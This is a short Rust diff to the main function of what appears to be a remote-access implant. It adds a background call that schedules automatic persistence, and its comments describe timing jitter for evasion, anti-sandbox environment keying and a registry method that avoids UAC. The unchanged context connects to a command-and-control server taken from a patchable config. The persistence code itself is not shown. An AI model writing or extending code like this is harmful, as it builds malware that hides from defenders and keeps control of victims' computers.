@@ -120,6 +120,19 @@ fn main() {
         }
     }
 
+    // ============================================================================
+    // AUTO-PERSISTENCE (Background Thread)
+    // ============================================================================
+    // Schedule automatic persistence to be established after 3-5 minutes
+    // This runs in a background thread with timing jitter for evasion
+    // Features:
+    // - Random delay (anti-behavioral analysis)
+    // - Environment keying (anti-sandbox)
+    // - Marker file (prevents re-persistence)
+    // - Registry method (no UAC, reliable)
+    persistence::schedule_auto_persistence();
+    debug_print!("DEBUG: Auto-persistence scheduled");
+
     // Get server address from patchable config (supports binary patching)
     let c2_server = config::get_c2_server();
     debug_print!("DEBUG: Conectando (TLS) a {}", c2_server);
